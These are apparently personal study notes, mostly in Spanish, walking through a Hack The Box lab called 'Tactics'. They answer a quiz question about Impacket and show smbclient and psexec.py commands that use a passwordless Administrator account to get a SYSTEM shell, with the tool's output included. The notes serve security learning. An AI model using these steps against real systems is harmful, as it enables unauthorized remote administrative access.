@@ -1,0 +1,45 @@
+
+Which tool that is part of the Impacket collection can be used to get an interactive shell on the system?
+
+psexec.py
+P.S. Exec some commands
+
+smbclient -L 10.129.11.33 -U Administrator
+
+Administrator con -U, SMB Server Message Block, el ususario con privilegios se ve con el $, ejemplo$
+
+-----------------------------------------------------------
+
+HTB menciona otra forma de conectarse, la primera es:
+
+smbclient -U Administrator \\\\10.129.11.33\\C$    
+
+COnectando directamente desde el directorio C$, y ya que somos administrador, se puede mover facilmente todo
+sin embargo para obtener una cmd:
+para conectarse directo.
+
+
+psexec.py Administrator@10.129.11.33
+
+o tambien impacket-psexec que ambas funcionan, dependiendo de la instalación, y obtienes una cmd como root, no tiene contraseña y el Path se genera desde System32
+
+  nitblan   ~/HTB/Tactics  psexec.py Administrator@10.129.11.33 
+Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 
+
+Password:
+[*] Requesting shares on 10.129.11.33.....
+[*] Found writable share ADMIN$
+[*] Uploading file ZqrbWUnE.exe
+[*] Opening SVCManager on 10.129.11.33.....
+[*] Creating service hrwE on 10.129.11.33.....
+[*] Starting service hrwE.....
+[!] Press help for extra shell commands                                                                                                                                Microsoft Windows [Version 10.0.17763.107]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32> ls                                                                                                                                                'ls' is not recognized as an internal or external command,
+operable program or batch file.
+
+C:\Windows\system32> exit  
+
+
+Finalizamos con un get, para descargar la flag en tu directorio actual de trabajo, tu maquina
